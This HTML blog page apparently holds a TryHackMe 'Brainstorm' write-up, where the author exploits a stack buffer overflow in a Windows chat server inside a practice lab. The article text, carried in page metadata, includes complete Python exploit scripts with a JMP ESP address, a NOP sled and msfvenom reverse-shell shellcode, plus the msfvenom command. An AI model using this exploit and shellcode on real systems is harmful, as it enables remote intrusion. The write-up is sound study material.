@@ -1,0 +1,633 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>TryHackMe - Brainstorm | All Things Cyber – joonkim0625</title>
+<meta name="keywords" content="ctf, tryHackMe, cybersecurity, windows, reverse shell, buffer overflow">
+<meta name="description" content="Challenge: Brainstorm
+This is a room that tests on reverse engineering a chat program to exploit a
+Windows machine.
+Recon
+Nmap:
+─$ nmap -sC -sV -Pn 10.10.37.33
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-22 00:02 EDT
+Nmap scan report for hi-hormel-wg010.hi.umn.edu (10.10.37.33)
+Host is up (0.22s latency).
+Not shown: 997 filtered tcp ports (no-response)
+PORT     STATE SERVICE            VERSION
+21/tcp   open  ftp                Microsoft ftpd
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can&#39;t get directory listing: TIMEOUT
+| ftp-syst:
+|_  SYST: Windows_NT
+3389/tcp open  ssl/ms-wbt-server?
+| rdp-ntlm-info:
+|   Target_Name: BRAINSTORM
+|   NetBIOS_Domain_Name: BRAINSTORM
+|   NetBIOS_Computer_Name: BRAINSTORM
+|   DNS_Domain_Name: brainstorm
+|   DNS_Computer_Name: brainstorm
+|   Product_Version: 6.1.7601
+|_  System_Time: 2023-09-22T04:05:48&#43;00:00
+| ssl-cert: Subject: commonName=brainstorm
+| Not valid before: 2023-09-21T03:52:41
+|_Not valid after:  2024-03-22T03:52:41
+|_ssl-date: 2023-09-22T04:06:19&#43;00:00; &#43;1s from scanner time.
+9999/tcp open  abyss?
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 216.80 seconds
+First thing I noticed was Port 21 ftp was open with the anonymous FTP login
+enabled. I checked it out by running ftp 10.10.37.33 with the name
+anonymous.">
+<meta name="author" content="Joon Kim">
+<link rel="canonical" href="https://joonkim0625.github.io/posts/2023-9-23-thm-brainstorm/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.8fe10233a706bc87f2e08b3cf97b8bd4c0a80f10675a143675d59212121037c0.css" integrity="sha256-j&#43;ECM6cGvIfy4Is8&#43;XuL1MCoDxBnWhQ2ddWSEhIQN8A=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://joonkim0625.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://joonkim0625.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://joonkim0625.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://joonkim0625.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://joonkim0625.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://joonkim0625.github.io/posts/2023-9-23-thm-brainstorm/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:url" content="https://joonkim0625.github.io/posts/2023-9-23-thm-brainstorm/">
+  <meta property="og:site_name" content="All Things Cyber – joonkim0625">
+  <meta property="og:title" content="TryHackMe - Brainstorm">
+  <meta property="og:description" content="Challenge: Brainstorm This is a room that tests on reverse engineering a chat program to exploit a Windows machine.
+Recon Nmap:
+─$ nmap -sC -sV -Pn 10.10.37.33 Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-22 00:02 EDT Nmap scan report for hi-hormel-wg010.hi.umn.edu (10.10.37.33) Host is up (0.22s latency). Not shown: 997 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_Can&#39;t get directory listing: TIMEOUT | ftp-syst: |_ SYST: Windows_NT 3389/tcp open ssl/ms-wbt-server? | rdp-ntlm-info: | Target_Name: BRAINSTORM | NetBIOS_Domain_Name: BRAINSTORM | NetBIOS_Computer_Name: BRAINSTORM | DNS_Domain_Name: brainstorm | DNS_Computer_Name: brainstorm | Product_Version: 6.1.7601 |_ System_Time: 2023-09-22T04:05:48&#43;00:00 | ssl-cert: Subject: commonName=brainstorm | Not valid before: 2023-09-21T03:52:41 |_Not valid after: 2024-03-22T03:52:41 |_ssl-date: 2023-09-22T04:06:19&#43;00:00; &#43;1s from scanner time. 9999/tcp open abyss? Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 216.80 seconds First thing I noticed was Port 21 ftp was open with the anonymous FTP login enabled. I checked it out by running ftp 10.10.37.33 with the name anonymous.">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2023-09-23T00:10:00+00:00">
+    <meta property="article:modified_time" content="2023-09-23T00:10:00+00:00">
+    <meta property="article:tag" content="CTF">
+    <meta property="article:tag" content="TryHackMe">
+    <meta property="article:tag" content="Cybersecurity">
+    <meta property="article:tag" content="Windows">
+    <meta property="article:tag" content="Reverse Shell">
+    <meta property="article:tag" content="Buffer Overflow">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="TryHackMe - Brainstorm">
+<meta name="twitter:description" content="Challenge: Brainstorm
+This is a room that tests on reverse engineering a chat program to exploit a
+Windows machine.
+Recon
+Nmap:
+─$ nmap -sC -sV -Pn 10.10.37.33
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-22 00:02 EDT
+Nmap scan report for hi-hormel-wg010.hi.umn.edu (10.10.37.33)
+Host is up (0.22s latency).
+Not shown: 997 filtered tcp ports (no-response)
+PORT     STATE SERVICE            VERSION
+21/tcp   open  ftp                Microsoft ftpd
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can&#39;t get directory listing: TIMEOUT
+| ftp-syst:
+|_  SYST: Windows_NT
+3389/tcp open  ssl/ms-wbt-server?
+| rdp-ntlm-info:
+|   Target_Name: BRAINSTORM
+|   NetBIOS_Domain_Name: BRAINSTORM
+|   NetBIOS_Computer_Name: BRAINSTORM
+|   DNS_Domain_Name: brainstorm
+|   DNS_Computer_Name: brainstorm
+|   Product_Version: 6.1.7601
+|_  System_Time: 2023-09-22T04:05:48&#43;00:00
+| ssl-cert: Subject: commonName=brainstorm
+| Not valid before: 2023-09-21T03:52:41
+|_Not valid after:  2024-03-22T03:52:41
+|_ssl-date: 2023-09-22T04:06:19&#43;00:00; &#43;1s from scanner time.
+9999/tcp open  abyss?
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 216.80 seconds
+First thing I noticed was Port 21 ftp was open with the anonymous FTP login
+enabled. I checked it out by running ftp 10.10.37.33 with the name
+anonymous.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://joonkim0625.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "TryHackMe - Brainstorm",
+      "item": "https://joonkim0625.github.io/posts/2023-9-23-thm-brainstorm/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "TryHackMe - Brainstorm",
+  "name": "TryHackMe - Brainstorm",
+  "description": "Challenge: Brainstorm This is a room that tests on reverse engineering a chat program to exploit a Windows machine.\nRecon Nmap:\n─$ nmap -sC -sV -Pn 10.10.37.33 Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-22 00:02 EDT Nmap scan report for hi-hormel-wg010.hi.umn.edu (10.10.37.33) Host is up (0.22s latency). Not shown: 997 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_Can\u0026#39;t get directory listing: TIMEOUT | ftp-syst: |_ SYST: Windows_NT 3389/tcp open ssl/ms-wbt-server? | rdp-ntlm-info: | Target_Name: BRAINSTORM | NetBIOS_Domain_Name: BRAINSTORM | NetBIOS_Computer_Name: BRAINSTORM | DNS_Domain_Name: brainstorm | DNS_Computer_Name: brainstorm | Product_Version: 6.1.7601 |_ System_Time: 2023-09-22T04:05:48+00:00 | ssl-cert: Subject: commonName=brainstorm | Not valid before: 2023-09-21T03:52:41 |_Not valid after: 2024-03-22T03:52:41 |_ssl-date: 2023-09-22T04:06:19+00:00; +1s from scanner time. 9999/tcp open abyss? Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 216.80 seconds First thing I noticed was Port 21 ftp was open with the anonymous FTP login enabled. I checked it out by running ftp 10.10.37.33 with the name anonymous.\n",
+  "keywords": [
+    "ctf", "tryHackMe", "cybersecurity", "windows", "reverse shell", "buffer overflow"
+  ],
+  "articleBody": "Challenge: Brainstorm This is a room that tests on reverse engineering a chat program to exploit a Windows machine.\nRecon Nmap:\n─$ nmap -sC -sV -Pn 10.10.37.33 Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-22 00:02 EDT Nmap scan report for hi-hormel-wg010.hi.umn.edu (10.10.37.33) Host is up (0.22s latency). Not shown: 997 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_Can't get directory listing: TIMEOUT | ftp-syst: |_ SYST: Windows_NT 3389/tcp open ssl/ms-wbt-server? | rdp-ntlm-info: | Target_Name: BRAINSTORM | NetBIOS_Domain_Name: BRAINSTORM | NetBIOS_Computer_Name: BRAINSTORM | DNS_Domain_Name: brainstorm | DNS_Computer_Name: brainstorm | Product_Version: 6.1.7601 |_ System_Time: 2023-09-22T04:05:48+00:00 | ssl-cert: Subject: commonName=brainstorm | Not valid before: 2023-09-21T03:52:41 |_Not valid after: 2024-03-22T03:52:41 |_ssl-date: 2023-09-22T04:06:19+00:00; +1s from scanner time. 9999/tcp open abyss? Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 216.80 seconds First thing I noticed was Port 21 ftp was open with the anonymous FTP login enabled. I checked it out by running ftp 10.10.37.33 with the name anonymous.\nWhen I tried to ls the ftp server, it prompted 229 Entering Extended Passive Mode (|||49178|). Simply you need to type passiveto turn the passive mode off. After that, I was able to spot the chatserver directory. Moving into the directory, there were two files chatserver.exe and essfunc.dll. I learned that when you download a binary from a ftp server, you would want to turn on the binary option to make sure the files do not get corrupted while being transferred. I ran binary and prompt OFF (to turn off the prompt asking yes or no) then ran mget * to download all the files.\nTo move files between the guest VMs in VirtualBox, I used File Manager functionality which allows you to move files between the host and the guest\nlink. I prepared two VMs: Kali, Windows and set up the networking between them. I followed this write-up - https://www.makeuseof.com/how-network-two-virtual-machines-with-virtualbox/\nReverse engineering a Windows binary For this task, the write-up suggests the Immunity Debugger and Mona python script. In short, buffer overflow is a way to control the flow of code execution by overwriting the EIP register which stores the memory address of the next instruction to be executed. If we are able to overwrite this register with the memory address of our choice, we can do many interesting things!\nAfter installing the immunity debugger and loading the chatserver executable, you will see something like this:\nWhen trying to exploit a buffer overflow vulnerability, one would try to input a bunch of bytes to see if we can break the program. So what I did was to create a cyclic pattern of 5000 bytes and sent it to the chatserver program. I used pwntools which is a CTF framework written in Python - it has a lot of useful tools (you can install it through pip). To create 5000 bytes of cyclic pattern, pwn cyclic 5000. The I copied and pasted the cyclic pattern and passed them as the input message for the program. The program crashed and the immunity debugger showed this:\nAs we can see, the EIP register is now 75616164 (in hex) and we can use these four bytes to find the offset from the beginning of the input buffer to the beginning of the EIP register. That can be done by running pwn cyclic -l 0x75616164. This gave me 2012 meaning we would need some random 2012 bytes before actually overwriting the first byte of the EIP register. So, if we send 2012 bytes of something plus BBBB, the EIP should end up being 0x42424242.\nWe can automate the process by creating a python script that would do the job for us.\nimport socket import sys username = b'hello' payload = b'A' * 2012 + b'B' * 4 target_ip = '10.0.2.15' target_port = 9999 try: print(\"Sending payload...\") s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((target_ip, target_port)) s.recv(1024) s.recv(1024) s.send(username + b'\\r\\n') # '\\r\\n' -\u003e return + new line : hitting enter, a single \\n might do the job s.recv(1024) s.send(payload + b'\\r\\n') s.recv(1024) s.close() except: print(\"Cannot connect to the server\") Now this script should do the same thing as what we were doing in the terminal. The next step is to find the bad characters that might exist in the program. We need to find them to prevent any issues that could arise from our shellcode not working. For example, x00 is one of the bad characters, which is a null character - it terminates the byte stream.\nhttps://github.com/cytopia/badchars Useful resource for badchars After visiting the Github page, I modified the script above to send them with the payload.\nimport socket import sys username = b'hello' payload = b'A' * 2012 + b'B' * 4 target_ip = '10.0.2.15' target_port = 9999 badchars = ( b\"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\" b\"\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\" b\"\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\" b\"\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\" b\"\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\" b\"\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\" b\"\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\" b\"\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\" b\"\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\" b\"\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\" b\"\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\" b\"\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\" b\"\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\" b\"\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\" b\"\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\" b\"\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\" ) try: print(\"Sending payload...\") s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((target_ip, target_port)) s.recv(1024) s.recv(1024) s.send(username + b'\\r\\n') # '\\r\\n' -\u003e return + new line : hitting enter, a single \\n might do the job s.recv(1024) s.send(payload + badchars + b'\\r\\n') s.recv(1024) s.close() except: print(\"Cannot connect to the server\") try: print(\"Sending payload...\") s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((target_ip, target_port)) s.recv(1024) s.recv(1024) s.send(username + b'\\r\\n') # '\\r\\n' -\u003e return + new line : hitting enter s.recv(1024) s.send(payload + shellcode + b'\\r\\n') s.recv(1024) s.close() except: print(\"Cannot connect to the server\") After running the script again (make sure you re-launch the program in the debugger), you can right-click the value of ESP register and click Follow in Dump. I was able to see the bad characters I sent along with the payload:\nWe can see the start of the badchars 01 02 03 ... 9E 0F A0. As I mentioned earlier, we can use mona with the debugger to make our lives a bit easier. I found this article and this that walk through how to use moan with the debugger.\nAccording to the second article, first we need to set the base directory for mona by running !mona config -set workingfolder C:\\monaand run !mona bytearray -cpb \\x00. This will generate files bytearray.txt and bytearray.bin in the base directory and we can use them to compare the current badchars sequence that we passed into the program.\nRunning this command !mona compare -a esp -f C:\\mona\\bytearray.bin will tell you if there are any bad characters. After running it, I got this result:\nSo, other than the null byte, we could use all the bytes to create a shellcode. The next thing we need to do is to check if there are any protection mechanisms in place. You can check it easily by running !monal modules. The result of the run looks like this:\nWhat we want to look at is the lines that have all False columns and there are two: chatserver.exe and essfunc.dll (the dll library we downloaded from the ftp server).\nI learned that, just like how we would try to find gadgets from ELF files in Linux, we need to find an instruction that allows us to jump to ESP so we can redirect the code flow to our shellcode. !mona find -s \"\\xff\\xe4\" -m essfunc.dll is the command we want to run: \\xff\\xe4 is the byte instruction for JMP ESP.\nThere were several JMP ESP instructions in the dll file. Let’s say I am going to use the address of 0x625014df. When we use this address in our script, this address needs to be entered in little-endian order. Now we need to create a shellcode.\nmsfvenom -p windows/shell_reverse_tcp LHOST= LPORT= -b \"\\x00\" -f c\nThis is a shellcode written in C (-f c) and it specifies the bad character (-b \"\\x00\"). After copying and pasting the shellcode to the script file, it looks like this now:\nimport socket import sys username = b'hello' target_ip = '10.0.2.15' target_port = 9999 jmp_esp = b'\\xdf\\x14\\x50\\x62' payload = b'A' * 2012 + jmp_esp + b\"\\x90\" * 32 # adding a few nop instructions shellcode = (b\"\\xdb\\xc1\\xbf\\x36\\x67\\xf6\\xf3\\xd9\\x74\\x24\\xf4\\x5a\\x31\\xc9\" b\"\\xb1\\x52\\x31\\x7a\\x17\\x03\\x7a\\x17\\x83\\xdc\\x9b\\x14\\x06\\xdc\" b\"\\x8c\\x5b\\xe9\\x1c\\x4d\\x3c\\x63\\xf9\\x7c\\x7c\\x17\\x8a\\x2f\\x4c\" b\"\\x53\\xde\\xc3\\x27\\x31\\xca\\x50\\x45\\x9e\\xfd\\xd1\\xe0\\xf8\\x30\" b\"\\xe1\\x59\\x38\\x53\\x61\\xa0\\x6d\\xb3\\x58\\x6b\\x60\\xb2\\x9d\\x96\" b\"\\x89\\xe6\\x76\\xdc\\x3c\\x16\\xf2\\xa8\\xfc\\x9d\\x48\\x3c\\x85\\x42\" b\"\\x18\\x3f\\xa4\\xd5\\x12\\x66\\x66\\xd4\\xf7\\x12\\x2f\\xce\\x14\\x1e\" b\"\\xf9\\x65\\xee\\xd4\\xf8\\xaf\\x3e\\x14\\x56\\x8e\\x8e\\xe7\\xa6\\xd7\" b\"\\x29\\x18\\xdd\\x21\\x4a\\xa5\\xe6\\xf6\\x30\\x71\\x62\\xec\\x93\\xf2\" b\"\\xd4\\xc8\\x22\\xd6\\x83\\x9b\\x29\\x93\\xc0\\xc3\\x2d\\x22\\x04\\x78\" b\"\\x49\\xaf\\xab\\xae\\xdb\\xeb\\x8f\\x6a\\x87\\xa8\\xae\\x2b\\x6d\\x1e\" b\"\\xce\\x2b\\xce\\xff\\x6a\\x20\\xe3\\x14\\x07\\x6b\\x6c\\xd8\\x2a\\x93\" b\"\\x6c\\x76\\x3c\\xe0\\x5e\\xd9\\x96\\x6e\\xd3\\x92\\x30\\x69\\x14\\x89\" b\"\\x85\\xe5\\xeb\\x32\\xf6\\x2c\\x28\\x66\\xa6\\x46\\x99\\x07\\x2d\\x96\" b\"\\x26\\xd2\\xe2\\xc6\\x88\\x8d\\x42\\xb6\\x68\\x7e\\x2b\\xdc\\x66\\xa1\" b\"\\x4b\\xdf\\xac\\xca\\xe6\\x1a\\x27\\xff\\xf6\\x26\\xb3\\x97\\xf4\\x26\" b\"\\xbf\\xb5\\x70\\xc0\\xd5\\x29\\xd5\\x5b\\x42\\xd3\\x7c\\x17\\xf3\\x1c\" b\"\\xab\\x52\\x33\\x96\\x58\\xa3\\xfa\\x5f\\x14\\xb7\\x6b\\x90\\x63\\xe5\" b\"\\x3a\\xaf\\x59\\x81\\xa1\\x22\\x06\\x51\\xaf\\x5e\\x91\\x06\\xf8\\x91\" b\"\\xe8\\xc2\\x14\\x8b\\x42\\xf0\\xe4\\x4d\\xac\\xb0\\x32\\xae\\x33\\x39\" b\"\\xb6\\x8a\\x17\\x29\\x0e\\x12\\x1c\\x1d\\xde\\x45\\xca\\xcb\\x98\\x3f\" b\"\\xbc\\xa5\\x72\\x93\\x16\\x21\\x02\\xdf\\xa8\\x37\\x0b\\x0a\\x5f\\xd7\" b\"\\xba\\xe3\\x26\\xe8\\x73\\x64\\xaf\\x91\\x69\\x14\\x50\\x48\\x2a\\x24\" b\"\\x1b\\xd0\\x1b\\xad\\xc2\\x81\\x19\\xb0\\xf4\\x7c\\x5d\\xcd\\x76\\x74\" b\"\\x1e\\x2a\\x66\\xfd\\x1b\\x76\\x20\\xee\\x51\\xe7\\xc5\\x10\\xc5\\x08\" b\"\\xcc\") try: print(\"Sending payload...\") s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((target_ip, target_port)) s.recv(1024) s.recv(1024) s.send(username + b'\\r\\n') # '\\r\\n' -\u003e return + new line : hitting enter s.recv(1024) s.send(payload + shellcode + b'\\r\\n') s.recv(1024) s.close() except: print(\"Cannot connect to the server\") When I ran the script without adding any nop instructions, it would not work. After adding a few bytes of nop instructions, I was able to create the reverse shell connection between the Kali VM and the Windows VM.\nNow it is time to test the script on the actual target of this challenge and the Kali VM’s IP address (the one that is connected to the THM’s VPN tunnel - tun0).\nAfter modifying the script, I was able to access the target machine.\nThings I learned from this room Allowing communication (networking) between Guest VMs The use of Immunity Debugger and Mona script ",
+  "wordCount" : "1515",
+  "inLanguage": "en",
+  "datePublished": "2023-09-23T00:10:00Z",
+  "dateModified": "2023-09-23T00:10:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "Joon Kim"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://joonkim0625.github.io/posts/2023-9-23-thm-brainstorm/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "All Things Cyber – joonkim0625",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://joonkim0625.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://joonkim0625.github.io/" accesskey="h" title="All Things Cyber – joonkim0625 (Alt + H)">All Things Cyber – joonkim0625</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://joonkim0625.github.io/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://joonkim0625.github.io/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://joonkim0625.github.io/about/" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      TryHackMe - Brainstorm
+    </h1>
+    <div class="post-meta"><span title='2023-09-23 00:10:00 +0000 UTC'>September 23, 2023</span>&nbsp;·&nbsp;Joon Kim
+
+</div>
+  </header> 
+  <div class="post-content"><h2 id="challenge-brainstorm">Challenge: Brainstorm<a hidden class="anchor" aria-hidden="true" href="#challenge-brainstorm">#</a></h2>
+<p>This is a room that tests on reverse engineering a chat program to exploit a
+Windows machine.</p>
+<h2 id="recon">Recon<a hidden class="anchor" aria-hidden="true" href="#recon">#</a></h2>
+<p>Nmap:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">─$</span> nmap <span style="color:#f92672">-</span>sC <span style="color:#f92672">-</span>sV <span style="color:#f92672">-</span>Pn <span style="color:#ae81ff">10.10.37.33</span>
+</span></span><span style="display:flex;"><span>Starting Nmap <span style="color:#ae81ff">7.93</span> ( https:<span style="color:#f92672">//</span>nmap<span style="color:#f92672">.</span>org ) at <span style="color:#ae81ff">2023</span><span style="color:#f92672">-</span><span style="color:#ae81ff">09</span><span style="color:#f92672">-</span><span style="color:#ae81ff">22</span> <span style="color:#ae81ff">00</span>:<span style="color:#ae81ff">02</span> EDT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> hi<span style="color:#f92672">-</span>hormel<span style="color:#f92672">-</span>wg010<span style="color:#f92672">.</span>hi<span style="color:#f92672">.</span>umn<span style="color:#f92672">.</span>edu (<span style="color:#ae81ff">10.10.37.33</span>)
+</span></span><span style="display:flex;"><span>Host <span style="color:#f92672">is</span> up (<span style="color:#ae81ff">0.22</span>s latency)<span style="color:#f92672">.</span>
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">997</span> filtered tcp ports (no<span style="color:#f92672">-</span>response)
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE            VERSION
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">21</span><span style="color:#f92672">/</span>tcp   open  ftp                Microsoft ftpd
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> ftp<span style="color:#f92672">-</span>anon: Anonymous FTP login allowed (FTP code <span style="color:#ae81ff">230</span>)
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>_Can<span style="color:#e6db74">&#39;t get directory listing: TIMEOUT</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> ftp<span style="color:#f92672">-</span>syst:
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>_  SYST: Windows_NT
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3389</span><span style="color:#f92672">/</span>tcp open  ssl<span style="color:#f92672">/</span>ms<span style="color:#f92672">-</span>wbt<span style="color:#f92672">-</span>server<span style="color:#960050;background-color:#1e0010">?</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> rdp<span style="color:#f92672">-</span>ntlm<span style="color:#f92672">-</span>info:
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>   Target_Name: BRAINSTORM
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>   NetBIOS_Domain_Name: BRAINSTORM
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>   NetBIOS_Computer_Name: BRAINSTORM
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>   DNS_Domain_Name: brainstorm
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>   DNS_Computer_Name: brainstorm
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>   Product_Version: <span style="color:#ae81ff">6.1.7601</span>
